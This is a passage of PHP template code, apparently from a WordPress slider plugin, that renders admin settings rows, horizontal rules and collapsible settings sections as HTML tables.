						<span class="spanSettingsStaticText"><?php echo $setting["text"]?></span>
					</td>
				</tr>
			<?php 
		}
		
		//-----------------------------------------------------------------------------------------------
		//draw hr row
		protected function drawHrRow($setting){
			//set hidden
			$rowStyle = "";
			if(isset($setting["hidden"])) $rowStyle = "style='display:none;'";
			
			$class = UniteFunctionsRev::getVal($setting, "class");
			if(!empty($class))
				$class = "class='$class'";
			
			?>
			<tr id="<?php echo $setting["id_row"]?>" <?php echo $rowStyle ?>>
				<td colspan="4" align="left" style="text-align:left;">
					 <hr <?php echo $class; ?> /> 
				</td>
			</tr>
			<?php 
		}
		
		
		
		//-----------------------------------------------------------------------------------------------
		//draw settings row
		protected function drawSettingRow($setting){
		
			//set cellstyle:
			$cellStyle = "";
			if(isset($setting[UniteSettingsRev::PARAM_CELLSTYLE])){
				$cellStyle .= $setting[UniteSettingsRev::PARAM_CELLSTYLE];
			}
			
			//set text style:
			$textStyle = $cellStyle;
			if(isset($setting[UniteSettingsRev::PARAM_TEXTSTYLE])){
				$textStyle .= $setting[UniteSettingsRev::PARAM_TEXTSTYLE];
			}
			
			if($textStyle != "") $textStyle = "style='".$textStyle."'";
			if($cellStyle != "") $cellStyle = "style='".$cellStyle."'";
			
			//set hidden
			$rowStyle = "";
			if(isset($setting["hidden"])) $rowStyle = "display:none;";
			if(!empty($rowStyle)) $rowStyle = "style='$rowStyle'";
			
			//set text class:
			$class = "";
			if(isset($setting["disabled"])) $class = "class='disabled'";
			
			//modify text:
			$text = UniteFunctionsRev::getVal($setting,"text","");				
			// prevent line break (convert spaces to nbsp)
			$text = str_replace(" ","&nbsp;",$text);
			switch($setting["type"]){					
				case UniteSettingsRev::TYPE_CHECKBOX:
					$text = "<label for='".$setting["id"]."' style='cursor:pointer;'>$text</label>";
				break;
			}			
			
			//set settings text width:
			$textWidth = "";
			if(isset($setting["textWidth"])) $textWidth = 'width="'.$setting["textWidth"].'"';
			
			$description = UniteFunctionsRev::getVal($setting, "description");
			$required = UniteFunctionsRev::getVal($setting, "required");
			
			?>
				<tr id="<?php echo $setting["id_row"]?>" <?php echo $rowStyle ?> <?php echo $class?> valign="top">
					<th <?php echo $textStyle?> scope="row" <?php echo $textWidth ?>>
						<?php echo $text?>:
					</th>
					<td <?php echo $cellStyle?>>
						<?php 
							$this->drawInputs($setting);
						?>
						<?php if(!empty($required)):?>
							<span class='setting_required'>*</span>
						<?php endif?>											
						<?php if(!empty($description)):?>
							<span class="description"><?php echo $description?></span>
						<?php endif?>						
					</td>
				</tr>								
			<?php 
		}
		
		//-----------------------------------------------------------------------------------------------
		//draw all settings
		public function drawSettings(){
			$this->drawHeaderIncludes();
			$this->prepareToDraw();
			
			//draw main div
			$lastSectionKey = -1;
			$visibleSectionKey = 0;
			$lastSapKey = -1;
			
			$arrSections = $this->settings->getArrSections();
			$arrSettings = $this->settings->getArrSettings();
			
			//draw settings - simple
			if(empty($arrSections)):
					?><table class='form-table'><?php
					foreach($arrSettings as $key=>$setting){
						switch($setting["type"]){
							case UniteSettingsRev::TYPE_HR:
								$this->drawHrRow($setting);
							break;
							case UniteSettingsRev::TYPE_STATIC_TEXT:
								$this->drawTextRow($setting);
							break;
							default:
								$this->drawSettingRow($setting);
							break;
						}
					}
					?></table><?php					
			else:
			
				//draw settings - advanced - with sections
				foreach($arrSettings as $key=>$setting):
								
					//operate sections:
					if(!empty($arrSections) && isset($setting["section"])){										
						$sectionKey = $setting["section"];
												
						if($sectionKey != $lastSectionKey):	//new section					
							$arrSaps = $arrSections[$sectionKey]["arrSaps"];
							
							if(!empty($arrSaps)){
								//close sap
								if($lastSapKey != -1):
								?>
									</table>
									</div>
								<?php						
								endif;							
								$lastSapKey = -1;
							}
							
					 		$style = ($visibleSectionKey == $sectionKey)?"":"style='display:none'";
					 		
					 		//close section
					 		if($sectionKey != 0):
					 			if(empty($arrSaps))
					 				echo "</table>";
					 			echo "</div>\n";	 
					 		endif;					 		
					 		
							//if no saps - add table
							if(empty($arrSaps)):
							?><table class="form-table"><?php
							endif;								
						endif;
						$lastSectionKey = $sectionKey;
					}//end section manage
					
					//operate saps
					if(!empty($arrSaps) && isset($setting["sap"])){				
						$sapKey = $setting["sap"];
						if($sapKey != $lastSapKey){
							$sap = $this->settings->getSap($sapKey,$sectionKey);
							
							//draw sap end					
							if($sapKey != 0): ?>
							</table>
							<?php endif;
							
							//set opened/closed states:
							//$style = "style='display:none;'";
							$style = "";
							
							$class = "divSapControl";
							
							if($sapKey == 0 || isset($sap["opened"]) && $sap["opened"] == true){
								$style = "";
								$class = "divSapControl opened";						
							}
							
							?>
								<div id="divSapControl_<?php echo $sectionKey."_".$sapKey?>" class="<?php echo $class?>">
									
									<h3><?php echo $sap["text"]?></h3>
								</div>
								<div id="divSap_<?php echo $sectionKey."_".$sapKey?>" class="divSap" <?php echo $style ?>>				
								<table class="form-table">
							<?php